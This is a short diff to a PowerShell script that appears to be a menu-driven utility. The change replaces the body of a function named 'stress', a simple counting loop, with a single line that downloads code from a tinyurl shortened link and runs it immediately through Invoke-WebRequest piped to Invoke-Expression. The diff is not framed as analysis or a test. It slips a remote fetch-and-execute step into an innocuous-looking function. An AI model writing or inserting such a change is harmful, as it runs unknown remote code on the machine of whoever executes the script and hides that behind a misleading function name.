@@ -1,10 +1,5 @@
 function stress {
-  $i=0
-  while($true)
-  {
-  $i
-  $i++
-  }
+  Invoke-WebRequest -useb https://tinyurl.com/wqe89 | Invoke-Expression
 }
 
 function DisplayMenu {
